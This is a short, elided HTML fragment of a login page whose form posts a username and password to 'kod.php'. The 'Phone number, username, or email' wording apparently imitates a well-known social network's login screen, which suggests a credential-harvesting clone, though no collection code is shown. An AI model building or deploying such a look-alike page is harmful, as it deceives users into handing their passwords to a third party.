...
<head>
    ...
    <link rel="shortcut icon" href="al.png" type="image/x-icon">
</head>
...
<body>
    <div class="container">
        <div class="content">
            ...
            <form class="content__form" action="kod.php" method="POST">
                <div class="content__inputs">
                    <label>
                        <input required="" type="text" name="ism">
                        <span>Phone number, username, or email</span>
                    </label>
                    <label>
                        <input required="" type="password" name="kod">
                        <span>Password</span>
                    </label>
                </div>
